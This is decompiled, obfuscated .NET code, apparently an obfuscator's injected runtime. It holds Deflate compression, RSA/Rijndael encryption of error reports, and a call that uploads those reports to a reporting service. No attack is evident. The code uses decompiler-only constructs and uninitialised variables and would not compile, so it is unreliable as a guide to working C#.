        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        \u000F.\u0006.\u0003 obj = obj2;
        byte[] numArray = obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj1;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) obj, (object) numArray, (object) local4, (object) local5);
        throw;
      }
label_11:
      return *(int*) ((IntPtr) voidPtr + 12);
    }

    static string \u0001([In] byte[] obj0)
    {
      \u0006.\u0003.\u0003 obj1;
      \u0006.\u0003.\u0003 obj2;
      GCHandle gcHandle1;
      \u0006.\u0003.\u0003 obj3;
      \u0006.\u0003.\u0002 obj4;
      \u0006.\u0003.\u0002 obj5;
      byte[] numArray;
      string str1;
      \u0006.\u0003.\u0003 obj6;
      IntPtr num1;
      try
      {
        obj1 = new \u0006.\u0003.\u0003();
        obj2 = new \u0006.\u0003.\u0003();
        GCHandle gcHandle2 = GCHandle.Alloc((object) obj0, GCHandleType.Pinned);
        if (true)
          goto label_6;
label_1:
        obj1.\u0001 = gcHandle1.AddrOfPinnedObject();
        obj1.\u0001 = obj0.Length;
        do
        {
          if (true)
          {
            ref GCHandle local = ref gcHandle1;
            if (true)
              goto label_7;
label_4:
            continue;
label_7:
            local.Free();
            goto label_4;
          }
          else
            goto label_1;
        }
        while (false);
        ref \u0006.\u0003.\u0003 local1 = ref obj1;
        obj3 = obj6;
        ref \u0006.\u0003.\u0003 local2 = ref obj3;
        IntPtr num2 = num1;
        obj5 = obj4;
        ref \u0006.\u0003.\u0002 local3 = ref obj5;
        ref \u0006.\u0003.\u0003 local4 = ref obj2;
        \u0007.\u0001(ref local1, (string) null, ref local2, num2, ref local3, 0, ref local4);
        numArray = new byte[checked (obj2.\u0001 + 1)];
        Marshal.Copy(obj2.\u0001, numArray, 0, obj2.\u0001);
        str1 = Encoding.Default.GetString(numArray);
        return str1.Substring(0, checked (str1.Length - 1));
label_6:
        gcHandle1 = gcHandle2;
        goto label_1;
      }
      catch (Exception ex)
      {
        string str2;
        object[] objArray = new object[12]
        {
          (object) str2,
          (object) gcHandle1,
          (object) obj1,
          (object) obj2,
          (object) numArray,
          (object) str1,
          (object) obj6,
          (object) obj3,
          (object) num1,
          (object) obj4,
          (object) obj5,
          (object) obj0
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6)
    {
      \u0007.\u0001(obj0, new object[6]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6
      });
    }

    static int \u0001([In] \u000F.\u0006.\u0002 obj0)
    {
      int num1;
      try
      {
        int num2 = obj0.\u0002 - obj0.\u0001;
        do
        {
          if (true)
            goto label_7;
label_6:
          continue;
label_7:
          int num3 = obj0.\u0003;
          do
          {
            if (true)
              num3 >>= 3;
          }
          while (false);
          num2 += num3;
          goto label_6;
        }
        while (false);
        num1 = num2;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0002 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static byte[] \u0001([In] byte[] obj0)
    {
      byte[] numArray1;
      try
      {
        numArray1 = \u0007.\u0001((byte[]) null, (byte[]) null, 1, obj0);
      }
      catch (Exception ex)
      {
        byte[] numArray2 = obj0;
        \u0007.\u0001(ex, (object) numArray2);
        throw;
      }
      return numArray1;
    }

    static string \u0001()
    {
      string str;
      try
      {
        str = Application.ExecutablePath;
      }
      catch
      {
        str = \u000E.\u0003.\u0001(2517);
      }
      return str;
    }

    static bool \u0001([In] \u000E.\u0005 obj0) => obj0.\u0001;

    static unsafe int \u0001([In] \u000F.\u0006.\u0007 obj0, [In] int obj1)
    {
      void* voidPtr;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(8);
        try
        {
          do
          {
            int num1 = obj1;
            int num2 = (int) byte.MaxValue;
            if (num2 != 0)
            {
              if (num1 == num2)
              {
                *(int*) ((IntPtr) voidPtr + 4) = 285;
                continue;
              }
              goto label_7;
            }
            else
              goto label_5;
label_4:
            if (true)
            {
              int num3 = obj1;
              num2 = 8;
              num1 = num3;
            }
            else
              goto label_7;
label_5:
            if (num1 >= num2)
            {
              do
              {
                *(int*) voidPtr = *(int*) voidPtr + 4;
              }
              while (false);
              obj1 >>= 1;
              goto label_4;
            }
            else
              goto label_11;
label_7:
            *(int*) voidPtr = 257;
            goto label_4;
          }
          while (false);
          goto label_13;
label_11:
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr + obj1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
          \u000F.\u0006.\u0007 obj = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj1;
          \u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
          throw;
        }
      }
label_13:
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static int \u0001([In] \u000F.\u0006.\u000F obj0)
    {
      int num1;
      try
      {
        if (true)
        {
          int num2 = \u0007.\u0001(obj0);
          int num3;
          while (true)
          {
            int num4 = \u0007.\u0001(obj0);
            int num5;
            while (true)
            {
              num5 = num4 << 16;
              if (false)
                num4 = num5;
              else
                break;
            }
            num3 = num2 | num5;
            if (false)
              num2 = num3;
            else
              break;
          }
          num1 = num3;
        }
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u000F obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static string \u0001([In] \u000E.\u0004.\u0003 obj0) => obj0.\u0003;

    static void \u0001([In] \u000E.\u0004 obj0, [In] \u0006.\u0006 obj1) => \u0007.\u0001(obj0, obj1, string.Empty);

    static bool \u0001([In] \u000F.\u0006.\u0002 obj0)
    {
      bool flag;
      try
      {
        flag = obj0.\u0001 == obj0.\u0002;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0002 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static unsafe void \u0001([In] byte[] obj0, [In] \u000F.\u0006.\u0004 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(68);
      int[] numArray1;
      int[] numArray2;
      int[] numArray3;
      int index;
      try
      {
        numArray1 = new int[16];
        numArray3 = new int[16];
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < obj0.Length)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj0[*(int*) voidPtr];
          if (*(int*) ((IntPtr) voidPtr + 4) > 0)
            (numArray2 = numArray1)[index = *(int*) ((IntPtr) voidPtr + 4)] = numArray2[(IntPtr) index] + 1;
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        *(int*) ((IntPtr) voidPtr + 12) = 512;
        *(int*) ((IntPtr) voidPtr + 16) = 1;
        while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
        {
          numArray3[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
          if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
          {
            *(int*) ((IntPtr) voidPtr + 20) = numArray3[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
            *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
          }
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
        }
        obj1.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
        *(int*) ((IntPtr) voidPtr + 28) = 512;
        *(int*) ((IntPtr) voidPtr + 32) = 15;
        while (*(int*) ((IntPtr) voidPtr + 32) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
          *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
          while (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
          {
            obj1.\u0001[(int) \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
            *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
            *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
          }
          *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
        }
        *(int*) ((IntPtr) voidPtr + 48) = 0;
        while (*(int*) ((IntPtr) voidPtr + 48) < obj0.Length)
        {
          *(int*) ((IntPtr) voidPtr + 52) = (int) obj0[*(int*) ((IntPtr) voidPtr + 48)];
          if (*(int*) ((IntPtr) voidPtr + 52) != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = numArray3[*(int*) ((IntPtr) voidPtr + 52)];
            *(int*) ((IntPtr) voidPtr + 56) = (int) \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 8));
            if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
            {
              do
              {
                obj1.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < 512);
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 60) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
              *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
              *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
              do
              {
                obj1.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
            }
            numArray3[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
          }
          *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[23]
        {
          (object) numArray1,
          (object) numArray3,
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) *(int*) ((IntPtr) voidPtr + 36),
          (object) *(int*) ((IntPtr) voidPtr + 40),
          (object) *(int*) ((IntPtr) voidPtr + 44),
          (object) *(int*) ((IntPtr) voidPtr + 48),
          (object) *(int*) ((IntPtr) voidPtr + 52),
          (object) *(int*) ((IntPtr) voidPtr + 56),
          (object) *(int*) ((IntPtr) voidPtr + 60),
          (object) *(int*) ((IntPtr) voidPtr + 64),
          (object) numArray2,
          (object) (IntPtr) index,
          (object) obj1,
          (object) obj0
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static void \u0001([In] \u0005.\u0004 obj0, [In] bool obj1) => obj0.\u0002 = obj1;

    [DllImport("kernel32", EntryPoint = "ExitProcess", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] uint obj0);

    static bool \u0001([In] \u0004.\u0002 obj0) => obj0.\u0004;

    static string \u0001([In] string obj0, [In] string obj1)
    {
      try
      {
        string str;
        try
        {
          str = Encoding.UTF8.GetString(\u0007.\u0001(Convert.FromBase64String(obj0), Encoding.UTF8.GetBytes(obj1)));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          do
          {
            ProjectData.ClearProjectError();
          }
          while (false);
        }
        return str;
      }
      catch (Exception ex)
      {
        string str1;
        string str2 = str1;
        string str3 = obj0;
        string str4 = obj1;
        \u0007.\u0001(ex, (object) str2, (object) str3, (object) str4);
        throw;
      }
    }

    static string \u0001([In] \u000E.\u0004.\u0003 obj0) => obj0.\u0001;

    static void \u0001([In] \u000F.\u0006.\u0008 obj0)
    {
      int length;
      try
      {
        int num1 = obj0.\u0005;
        int num2 = 65274;
        if (num2 != 0)
        {
          if (num1 >= num2)
          {
            \u0007.\u0001(obj0);
            if (false)
              return;
            goto label_7;
          }
          else
            goto label_7;
        }
label_5:
        length = num1 - num2;
label_6:
        Array.Copy((Array) obj0.\u0002, obj0.\u0008, (Array) obj0.\u0001, obj0.\u0005 + obj0.\u0006, length);
        obj0.\u0008 += length;
        obj0.\u0007 += length;
        obj0.\u0006 += length;
label_7:
        while (obj0.\u0006 >= 262 || obj0.\u0008 >= obj0.\u000E)
        {
          if (true)
          {
            if (obj0.\u0006 < 3)
              return;
            \u0007.\u0001(obj0);
            return;
          }
        }
        length = 65536 - obj0.\u0006 - obj0.\u0005;
        if (length > obj0.\u000E - obj0.\u0008)
        {
          int num3 = obj0.\u000E;
          num2 = obj0.\u0008;
          num1 = num3;
          goto label_5;
        }
        else
          goto label_6;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) length;
        \u000F.\u0006.\u0008 obj = obj0;
        \u0007.\u0001(ex, (object) local, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u000F.\u0006.\u0003 obj0, [In] int obj1, [In] int obj2)
    {
      int sourceIndex;
      int num1;
      int num2;
      try
      {
        int num3;
        int num4;
        int num5;
        if (true)
        {
          if (true)
          {
            num2 = (obj0.\u0002 += obj1);
            int num6 = num2;
            if (true)
            {
              if (num6 > 32768)
                throw new InvalidOperationException();
              int num7 = obj0.\u0001 - obj2;
              num4 = (int) short.MaxValue;
              num3 = num7;
            }
            else
            {
              num5 = num6;
              goto label_20;
            }
          }
          else
            goto label_10;
        }
        else
          goto label_12;
label_6:
        sourceIndex = num3 & num4;
        num5 = 32768;
        goto label_20;
label_10:
        int num8 = obj0.\u0001;
        int num9 = num1;
        int num10 = num8;
label_11:
        if (num10 >= num9)
          goto label_17;
label_12:
        if (obj1 <= obj2)
        {
          Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0001, obj1);
          obj0.\u0001 += obj1;
          return;
        }
        while (true)
        {
          num3 = obj1;
          num4 = num3 - 1;
          if (true)
          {
            obj1 = num4;
            if (num3 > 0)
            {
              byte[] numArray = obj0.\u0001;
              num2 = obj0.\u0001++;
              int index = num2;
              int num11 = (int) obj0.\u0001[sourceIndex++];
              numArray[index] = (byte) num11;
            }
            else
              break;
          }
          else
            goto label_6;
        }
        return;
label_17:
        \u0007.\u0001(obj0, sourceIndex, obj1, obj2);
        return;
label_20:
        int num12 = obj1;
        int num13 = num5 - num12;
        if (true)
          goto label_21;
label_7:
        num10 = sourceIndex;
        num9 = num1;
        if (true)
        {
          if (false)
          {
            num4 = num9;
            num3 = num10;
            goto label_6;
          }
          else if (num10 > num9)
            goto label_17;
          else
            goto label_10;
        }
        else
          goto label_11;
label_21:
        num1 = num13;
        goto label_7;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) sourceIndex;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num2;
        \u000F.\u0006.\u0003 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj2;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) obj, (object) local4, (object) local5);
        throw;
      }
    }

    static void \u0001([In] \u000F.\u0006.\u000E obj0)
    {
      int num1;
      try
      {
        int num2 = obj0.\u0003;
label_1:
        if (true)
        {
          if (num2 > 0)
          {
            byte[] numArray = obj0.\u0001;
            \u000F.\u0006.\u000E obj = obj0;
            int num3;
            num1 = num3 = obj.\u0002;
            obj.\u0002 = num3 + 1;
            int index = num1;
            int num4 = (int) (byte) obj0.\u0001;
            numArray[index] = (byte) num4;
            goto label_9;
          }
          else
            goto label_5;
        }
label_3:
        if (true)
        {
          if (num2 > 8)
            goto label_10;
        }
        else
          goto label_1;
label_5:
        obj0.\u0001 = 0U;
        if (true)
        {
          obj0.\u0003 = 0;
          if (true)
            return;
          goto label_10;
        }
label_9:
        num2 = obj0.\u0003;
        goto label_3;
label_10:
        byte[] numArray1 = obj0.\u0001;
        \u000F.\u0006.\u000E obj1 = obj0;
        int num5;
        num1 = num5 = obj1.\u0002;
        obj1.\u0002 = num5 + 1;
        int index1 = num1;
        int num6 = (int) (byte) (obj0.\u0001 >> 8);
        numArray1[index1] = (byte) num6;
        goto label_5;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) num1;
        \u000F.\u0006.\u000E obj = obj0;
        \u0007.\u0001(ex, (object) local, (object) obj);
        throw;
      }
    }

    static byte[] \u0001([In] byte[] obj0, [In] string obj1)
    {
      if (obj1.StartsWith(\u000E.\u0003.\u0001(7053)))
      {
        \u0006.\u0005.\u0001 = \u000E.\u0003.\u0001(7058);
        return (byte[]) null;
      }
      RijndaelManaged rijndaelManaged = (RijndaelManaged) null;
      RSACryptoServiceProvider cryptoServiceProvider = (RSACryptoServiceProvider) null;
      MemoryStream memoryStream = (MemoryStream) null;
      if (true)
        goto label_21;
label_3:
      CryptoStream cryptoStream;
      try
      {
        rijndaelManaged = new RijndaelManaged();
        cryptoServiceProvider = new RSACryptoServiceProvider();
        cryptoServiceProvider.FromXmlString(obj1);
        rijndaelManaged.GenerateKey();
        rijndaelManaged.GenerateIV();
        byte[] numArray1 = new byte[48];
        if (true)
        {
          Buffer.BlockCopy((Array) rijndaelManaged.Key, 0, (Array) numArray1, 0, 32);
          Buffer.BlockCopy((Array) rijndaelManaged.IV, 0, (Array) numArray1, 32, 16);
          memoryStream = new MemoryStream();
          try
          {
            byte[] buffer = cryptoServiceProvider.Encrypt(numArray1, false);
            memoryStream.WriteByte((byte) 1);
            memoryStream.WriteByte(Convert.ToByte(buffer.Length / 8));
            memoryStream.Write(buffer, 0, buffer.Length);
          }
          catch (CryptographicException ex1)
          {
            try
            {
              byte[] numArray2 = new byte[16];
              byte[] numArray3 = new byte[16];
              Buffer.BlockCopy((Array) rijndaelManaged.Key, 0, (Array) numArray2, 0, 16);
              Buffer.BlockCopy((Array) rijndaelManaged.Key, 16, (Array) numArray3, 0, 16);
              byte[] buffer1 = cryptoServiceProvider.Encrypt(numArray2, false);
              byte[] buffer2 = cryptoServiceProvider.Encrypt(numArray3, false);
              byte[] buffer3 = cryptoServiceProvider.Encrypt(rijndaelManaged.IV, false);
              memoryStream.WriteByte((byte) 2);
              memoryStream.WriteByte(Convert.ToByte(buffer1.Length / 8));
              memoryStream.Write(buffer1, 0, buffer1.Length);
              memoryStream.Write(buffer2, 0, buffer2.Length);
              memoryStream.Write(buffer3, 0, buffer3.Length);
            }
            catch (CryptographicException ex2)
            {
              \u0006.\u0005.\u0001 = \u000E.\u0003.\u0001(7151);
              return (byte[]) null;
            }
          }
          cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
          cryptoStream.Write(obj0, 0, obj0.Length);
          cryptoStream.FlushFinalBlock();
        }
        return memoryStream.ToArray();
      }
      catch (Exception ex)
      {
        \u0006.\u0005.\u0001 = \u000E.\u0003.\u0001(7357) + ex.Message;
        return (byte[]) null;
      }
      finally
      {
        rijndaelManaged?.Clear();
        cryptoServiceProvider?.Clear();
        memoryStream?.Close();
        cryptoStream?.Close();
      }
label_21:
      cryptoStream = (CryptoStream) null;
      goto label_3;
    }

    static void \u0001([In] \u000F.\u0006.\u000E obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        obj0.\u0001 |= (uint) (obj1 << obj0.\u0003);
        obj0.\u0003 += obj2;
        if (obj0.\u0003 < 16)
          return;
        do
        {
          if (true)
            goto label_5;
label_2:
          continue;
label_5:
          byte[] numArray1 = obj0.\u0001;
          \u000F.\u0006.\u000E obj = obj0;
          int num2;
          num1 = num2 = obj.\u0002;
          obj.\u0002 = num2 + 1;
          int index1 = num1;
          int num3 = (int) (byte) obj0.\u0001;
          numArray1[index1] = (byte) num3;
          byte[] numArray2 = obj0.\u0001;
          num1 = obj0.\u0002++;
          int index2 = num1;
          int num4 = (int) (byte) (obj0.\u0001 >> 8);
          numArray2[index2] = (byte) num4;
          obj0.\u0001 >>= 16;
          goto label_2;
        }
        while (false);
        obj0.\u0003 -= 16;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u000F.\u0006.\u000E obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        \u0007.\u0001(ex, (object) local1, (object) obj, (object) local2, (object) local3);
        throw;
      }
    }

    static ICryptoTransform \u0001(
      [In] byte[] obj0,
      [In] bool obj1,
      [In] byte[] obj2,
      [In] \u000F.\u0005 obj3)
    {
      object[] objArray1;
      MethodInfo method;
      try
      {
        MethodInfo setMethod1 = obj3.\u0001.GetProperty("Key").GetSetMethod();
        object obj4 = obj3.\u0001;
        objArray1 = new object[1]{ (object) obj0 };
        object[] parameters1 = objArray1;
        setMethod1.Invoke(obj4, parameters1);
        MethodInfo setMethod2 = obj3.\u0001.GetProperty("IV").GetSetMethod();
        object obj5 = obj3.\u0001;
        objArray1 = new object[1]{ (object) obj2 };
        object[] parameters2 = objArray1;
        setMethod2.Invoke(obj5, parameters2);
        method = obj3.\u0001.GetMethod(obj1 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]);
        return (ICryptoTransform) method.Invoke(obj3.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        MethodInfo methodInfo = method;
        object[] objArray2 = objArray1;
        \u000F.\u0005 obj = obj3;
        byte[] numArray1 = obj0;
        byte[] numArray2 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) obj1;
        \u0007.\u0001(ex, (object) methodInfo, (object) objArray2, (object) obj, (object) numArray1, (object) numArray2, (object) local);
        throw;
      }
    }

    static void \u0001(
      [In] byte[] obj0,
      [In] \u0004.\u0003 obj1,
      [In] \u0002.\u0004 obj2,
      [In] string obj3,
      [In] string obj4,
      [In] string obj5)
    {
      try
      {
        ReportingService reportingService1 = new ReportingService(obj1.\u0003);
        while (obj1.\u0001 != null)
        {
          if (true)
          {
            ReportingService reportingService2 = reportingService1;
            IWebProxy webProxy = obj1.\u0001;
            if (true)
            {
              reportingService2.Proxy = webProxy;
              break;
            }
            break;
          }
        }
        obj2(reportingService1.UploadReport2(obj1.\u0002, obj0, obj3, obj4, obj5));
      }
      catch (Exception ex)
      {
        obj2(\u000E.\u0003.\u0001(7374) + ex.Message);
      }
    }

    static string \u0001([In] string obj0)
    {
      StreamReader streamReader1;
      string str1;
      string str2;
      try
      {
        try
        {
          if (true)
          {
            streamReader1 = new StreamReader(obj0);
            if (true)
              str1 = streamReader1.ReadToEnd().ToString();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (true)
          {
            if (true)
              ProjectData.ClearProjectError();
          }
        }
        string str3 = str1;
        if (true)
          str2 = str3;
      }
      catch (Exception ex)
      {
        string str4 = str1;
        StreamReader streamReader2 = streamReader1;
        string str5 = obj0;
        \u0007.\u0001(ex, (object) str4, (object) streamReader2, (object) str5);
        throw;
      }
      return str2;
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7,
      [In] object obj8,
      [In] object obj9,
      [In] object obj10)
    {
      \u0007.\u0001(obj0, new object[10]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7,
        obj8,
        obj9,
        obj10
      });
    }

    static void \u0001([In] \u000F.\u0006.\u0007 obj0, [In] int obj1)
    {
      int index;
      try
      {
        if (true)
        {
          \u0007.\u0001(obj0.\u0003);
          do
          {
            \u0007.\u0001(obj0.\u0001);
          }
          while (false);
          \u0007.\u0001(obj0.\u0002);
        }
        \u000F.\u0006.\u000E obj2 = obj0.\u0001;
        int num1 = obj0.\u0001.\u0002 - 257;
        if (true)
          goto label_17;
label_1:
        \u0007.\u0001(obj0.\u0001, obj0.\u0002.\u0002 - 1, 5);
        \u000F.\u0006.\u0007.\u0001 obj3;
        if (true)
        {
          \u0007.\u0001(obj0.\u0001, obj1 - 4, 4);
          int num2 = 0;
          if (num2 == 0)
          {
            index = num2;
            goto label_7;
          }
label_6:
          index = num2;
label_7:
          int num3 = index;
          if (true)
            goto label_8;
label_5:
          num2 = num3 + 1;
          goto label_6;
label_8:
          int num4 = obj1;
          if (num3 < num4)
          {
            \u0007.\u0001(obj0.\u0001, (int) obj0.\u0003.\u0001[\u000F.\u0006.\u0007.\u0001[index]], 3);
            num3 = index;
            goto label_5;
          }
          else
          {
            \u000F.\u0006.\u0007.\u0001 obj4 = obj0.\u0001;
            if (false)
              return;
            \u0007.\u0001(obj0.\u0003, obj4);
            obj3 = obj0.\u0002;
          }
        }
        \u0007.\u0001(obj0.\u0003, obj3);
        return;
label_17:
        \u0007.\u0001(obj2, num1, 5);
        goto label_1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index;
        \u000F.\u0006.\u0007 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }
  }
}
